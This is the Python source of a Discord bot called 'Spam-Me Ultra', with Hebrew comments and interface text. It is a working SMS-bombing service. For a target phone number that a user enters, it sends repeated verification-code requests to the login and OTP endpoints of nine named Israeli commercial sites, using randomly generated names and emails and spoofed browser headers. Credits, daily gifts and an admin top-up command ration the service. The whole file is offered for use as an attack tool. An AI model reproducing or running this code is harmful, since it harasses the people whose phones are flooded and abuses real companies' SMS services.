import discord
from discord.ext import commands
from discord import ui
import requests
import uuid
import os
import time
import random
import string
from flask import Flask
from threading import Thread
from datetime import datetime

# --- שרת Flask (Keep Alive) ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

# --- הגדרות ---
TOKEN = os.environ.get('DISCORD_TOKEN')
ADMIN_ID = 1281295891579408418 

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

user_credits = {} 
daily_claimed = {}

def get_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_random_name():
    first_names = ["Noam", "Itay", "Amit", "Omer", "Daniel", "Ari", "Noa", "Maya"]
    last_names = ["Cohen", "Levi", "Mizrahi", "Peretz", "Biton", "Avraham"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# --- פונקציית התקיפה עם דיווח תוצאות ---
async def start_attack(interaction, target, rounds):
    success_count = 0
    failed_count = 0
    
    for r in range(rounds):
        f_email = f"{get_random_string(7)}@gmail.com"
        f_name = get_random_name()
        f_pass = get_random_string(10) + "A1!"
        f_uuid = str(uuid.uuid4())

        apis = [
            {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
            {"n": "Teva Bari", "u": "https://www.tevabari.co.il/index.php", "d": {"username": target, "option": "com_ajax", "plugin": "smsauth", "group": "authentication", "method": "smsauth", "task": "send", "format": "json"}, "type": "form", "ref": "https://www.tevabari.co.il/"},
            {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/verify", "d": {"phone": target, "source": "web"}, "type": "json", "ref": "https://www.mishloha.co.il/"},
            {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
            {"n": "Gefen Gefen", "u": "https://api-ns.atmos.co.il/rest/22/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 22, "source": "web"}, "type": "json", "ref": "https://gefen-gefen.co.il/"},
            {"n": "Machsanei Hashmal", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"},
            {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://fox.co.il/"},
            {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.laline.co.il/"},
            {"n": "Zygo", "u": "https://api.zygo.co.il/v1/auth/login", "d": {"phone": target, "email": f_email, "password": f_pass, "full_name": f_name}, "type": "json", "ref": "https://zygo.co.il/"}
        ]

        for site in apis:
            try:
                h = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15", "Referer": site["ref"], "X-Requested-With": "XMLHttpRequest"}
                
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=0.6)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=0.6)
                
                if res.status_code == 200 or res.status_code == 201:
                    success_count += 1
                else:
                    failed_count += 1
                
                time.sleep(0.05) 
            except:
                failed_count += 1
        
        time.sleep(0.5)

    # שליחת סיכום תקיפה למשתמש
    embed = discord.Embed(title="📊 סיכום תקיפה", color=0x00ff00)
    embed.add_field(name="📱 מטרה", value=target, inline=False)
    embed.add_field(name="✅ נשלחו בהצלחה", value=f"**{success_count}**", inline=True)
    embed.add_field(name="❌ נכשלו/נחסמו", value=f"**{failed_count}**", inline=True)
    embed.set_footer(text="Spam-Me Ultra Reporter")
    await interaction.followup.send(embed=embed, ephemeral=True)

# --- ממשק דיסקורד ---
class AttackModal(ui.Modal, title='🚀 Spam-Me Ultra Mode'):
    phone = ui.TextInput(label='מספר טלפון', placeholder='0501234567', min_length=10, max_length=10)
    rounds = ui.TextInput(label='כמות סבבים', placeholder='הזן מספר', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        uid = interaction.user.id
        try: needed = int(self.rounds.value)
        except: return await interaction.response.send_message("❌ הזן מספר תקין!", ephemeral=True)

        if user_credits.get(uid, 0) < needed:
            return await interaction.response.send_message(f"❌ אין קרדיטים!", ephemeral=True)
        
        user_credits[uid] -= needed
        await interaction.response.send_message(f"⚡ **התקיפה החלה!** נא להמתין לסיום הדיווח...", ephemeral=True)
        
        # הרצה ב-Thread נפרד כדי לא לתקוע את הבוט, אבל עם דיווח בסיום
        Thread(target=lambda: bot.loop.create_task(start_attack(interaction, self.phone.value, needed))).start()

class AttackView(ui.View):
    def __init__(self): super().__init__(timeout=None)
    @ui.button(label='🚀 התחל', style=discord.ButtonStyle.danger, custom_id='spam_btn')
    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(AttackModal())
    @ui.button(label='💰 יתרה', style=discord.ButtonStyle.secondary, custom_id='credits_btn')
    async def credits_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_message(f"💰 יתרה: **{user_credits.get(interaction.user.id, 0)}**", ephemeral=True)
    @ui.button(label='🎁 מתנה', style=discord.ButtonStyle.success, custom_id='gift_btn')
    async def gift_button(self, interaction: discord.Interaction, button: ui.Button):
        uid, today = interaction.user.id, datetime.now().date()
        if daily_claimed.get(uid) == today:
            return await interaction.response.send_message("❌ כבר לקחת היום!", ephemeral=True)
        user_credits[uid] = user_credits.get(uid, 0) + 5
        daily_claimed[uid] = today
        await interaction.response.send_message("✅ קיבלת 5 קרדיטים!", ephemeral=True)

@bot.event
async def on_ready():
    print(f'✅ {bot.user.name} Live!')
    bot.add_view(AttackView())

@bot.command()
async def setup(ctx):
    if ctx.author.id == ADMIN_ID:
        embed = discord.Embed(title="🔥 Spam-Me Ultra Panel", description="מערכת הספאם המהירה ביותר לישראל!\nכולל דוח תוצאות מפורט.", color=0xff0000)
        await ctx.send(embed=embed, view=AttackView())

@bot.command()
async def add(ctx, member: discord.Member, amount: int):
    if ctx.author.id == ADMIN_ID:
        user_credits[member.id] = user_credits.get(member.id, 0) + amount
        await ctx.send(f"✅ טענתי {amount} ל-{member.mention}")

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
